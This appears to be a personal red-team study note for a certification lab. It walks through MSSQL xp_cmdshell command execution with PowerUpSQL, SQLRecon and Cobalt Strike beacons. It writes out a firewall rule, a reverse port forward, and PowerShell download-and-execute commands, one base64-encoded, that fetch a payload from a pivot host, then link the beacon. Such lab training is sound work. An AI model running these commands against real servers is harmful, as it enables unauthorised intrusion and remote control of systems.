
The _xp_cmdshell_ procedure can be used to execute shell commands on the SQL server if you have sysadmin privileges.

#### 🖊️ checking the execution environment

1) Check if [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) tool `invoke-sqloscmd` can help you execute commands:

`beacon> powershell Invoke-SQLOSCmd -Instance "sql-2.dev.cyberbotic.io,1433" -Command "whoami" -RawResults`

⚠ This is disabled in Heidi and mssqlclient. If you are using either of them check this section to enable it: [[Enable Invoke-SQLOSCmd]]

2) If you are working with SQLRecon it also has a module to interact with xp shell, and you can impersonate as well:

`execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:ienablexp /i:DEV\mssql_svc`

3) After impersonating, test if you can run commands:

`beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:ixpcmd /i:DEV\mssql_svc /c:ipconfig`

#### 📔 Run payloads

1) With command execution, we can work towards executing a Beacon payload.  As with other servers in the lab, the SQL servers cannot talk directly to our team server in order to download a hosted payload.  Instead, we must setup a reverse port forward to tunnel that traffic through our C2 chain.

```
beacon> run hostname
wkstn-2

beacon> getuid
[*] You are DEV\bfarmer (admin)

beacon> powershell New-NetFirewallRule -DisplayName "8080-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8080

beacon> rportfwd 8080 127.0.0.1 80
[+] started reverse port forward on 8080 to 127.0.0.1:80
```

2) Check open ports in the target server, a useful one could be SMB. Host the payload on the team server and download the payload into the MS SQL Server:

`powershell -w hidden -c "iex (new-object net.webclient).downloadstring('http://wkstn-2:8080/b')"`
Or
`powershell -w hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AdwBrAHMAdABuAC0AMgA6ADgAMAA4ADAALwBiACcAKQA=`

⚠ Experiment with using the [[Pivot Listener]] here instead of SMB.

3) Finally, link yourself to the beacon

`beacon> link sql-2.dev.cyberbotic.io TSVCPIPE-ae2b7dc0-4ebe-4975-b8a0-06e990a41337`

![[mssqlsvc-beacon.png]]


#### ⚠ Opsec




### Properties
---
📆 created   {{21-02-2024}} 15:08
🏷️ tags: #redteam #crto 

---

